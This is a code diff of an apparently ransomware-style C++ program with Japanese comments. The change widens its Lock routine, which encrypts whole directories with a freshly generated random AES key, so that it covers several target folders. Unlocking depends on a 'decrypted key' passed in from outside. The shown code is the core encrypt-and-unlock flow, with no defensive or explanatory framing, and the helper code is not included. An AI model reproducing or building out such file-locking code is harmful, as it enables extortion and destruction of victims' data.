@@ -23,7 +23,7 @@ std::string randomKey()
 }
 
 
-bool Lock()
+bool Lock( std::vector<const std::string > targetDirPaths )
 {
 	std::string keyStr = randomKey();
 	openssl_wrapper::aes::W_AESKey_128 key( keyStr ); // AES 共通鍵の生成
@@ -39,7 +39,7 @@ bool Lock()
 	} 
 	/* 前準備完了 */
 
-	DirCryptor cryptor{ targetDirPath , &key }; // 暗号化オブジェクトの生成
+	DirCryptor cryptor{ targetDirPaths , &key }; // 暗号化オブジェクトの生成
 	bool flag = cryptor.startEncrypt(); // 暗号化処理開始
 	if( flag )
 	{
@@ -75,12 +75,12 @@ bool Lock()
 	return false;
 }
 
-bool UnLock( std::string decryptedKeyStr )
+bool UnLock( std::vector< const std::string > targetDirPaths ,std::string decryptedKeyStr )
 {
-	if( decryptedKeyStr.size() <= 0 ) return false;
+ 	if( decryptedKeyStr.size() <= 0 ) return false;
 	openssl_wrapper::aes::W_AESKey_128 key( decryptedKeyStr );
 
-	DirCryptor cryptor{ targetDirPath , &key  };
+	DirCryptor cryptor{ targetDirPaths , &key  };
 	bool flag = cryptor.startDecrypt();
 	if( flag )
 		std::cout << "ファイルの復号が正常に完了しました" << "\n\n";
@@ -98,6 +98,10 @@ int main( int argc , char* argv[] )
 {
   std::cout << "(User) : HelloWorld." << "\n";
 
+  std::vector< const std::string > targetDirPaths;
+  targetDirPaths.push_back( targetDirPath_1 );
+  targetDirPaths.push_back( targetDirPath_2 );
+
   std::string modeStr = argv[1];
   auto modeItr = mode.find( modeStr );
   if( modeItr == mode.end() ) return -1;
@@ -107,20 +111,20 @@ int main( int argc , char* argv[] )
   {
 	case 1: // ロック
 	  { 
-		Lock();
+		Lock( targetDirPaths );
   		break;
 	  } 
 
 	case 2: // アンロック
 	  {
 		std::string decryptedKeyStr = argv[2];
-		UnLock( decryptedKeyStr );
+		UnLock( targetDirPaths ,decryptedKeyStr );
 		break;
 	  }
 
 	case 3: // クリア ( debug )
 	  {
-		DirCryptor cryptor( targetDirPath );
+		DirCryptor cryptor( targetDirPaths );
 		cryptor.claerLockedFile();
 		break;
 	  }
